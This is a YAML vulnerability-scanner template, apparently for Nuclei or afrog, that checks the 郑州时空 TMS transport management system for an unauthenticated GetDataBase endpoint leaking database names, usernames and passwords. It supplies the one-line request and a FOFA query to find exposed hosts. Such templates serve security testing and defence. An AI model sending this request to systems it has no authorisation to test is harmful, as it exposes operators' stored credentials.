id: zzskzy-GetDataBase-disclosure
info:
  name: 郑州时空-TMS运输管理系统 GetDataBase 信息泄露
  author: leadlife
  severity: high
  description: 郑州时空-TMS运输管理系统 GetDataBase 接口存在信息泄露漏洞，未经身份验证攻击者可通过该漏洞读取系统内部数据库文件，泄露账号密码等重要凭证，导致网站处于极度不安全状态。
  reference: 
    - https://github.com/zan8in/afrog/commit/3155233108b64b10fd4817f94cca94f378ec3fc0
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: body="/Images/ManLogin/name.png"
  tags: 2025,zzskzy,disclosure

http:
  - raw:
      - |
        GET /ManLogin/GetDataBase HTTP/1.1
        Host: {{Hostname}}
        
    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains_all(body,'dataname','datausername','datauserpwd')
        condition: and